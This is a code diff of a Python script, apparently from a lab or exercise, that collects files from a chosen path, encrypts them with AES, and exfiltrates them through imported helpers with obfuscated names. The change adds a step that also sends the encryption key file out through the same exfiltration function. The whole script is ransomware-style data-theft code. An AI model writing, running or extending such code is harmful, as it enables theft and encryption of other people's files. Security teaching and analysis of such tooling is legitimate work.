@@ -1,6 +1,7 @@
 from task_2_obs import qx99       # File collection
 from task_3_obs import z91, s2v, j8f   # AES keygen/save/encrypt
 from task_4_exfiltrate_obs import r9  # Exfiltration
+import os
 
 # Task 2: Collect files
 path = input("Specify the path to use: ")
@@ -23,3 +24,11 @@ for p in paths:
 # Task 4: Exfiltrate
 for p in paths:
     r9(p)
+
+
+if os.path.exists('key.bin'):
+    print("[*] Sending key.bin ...")
+    r9('key.bin')
+else:
+    print("[-] key.bin not found.")
+
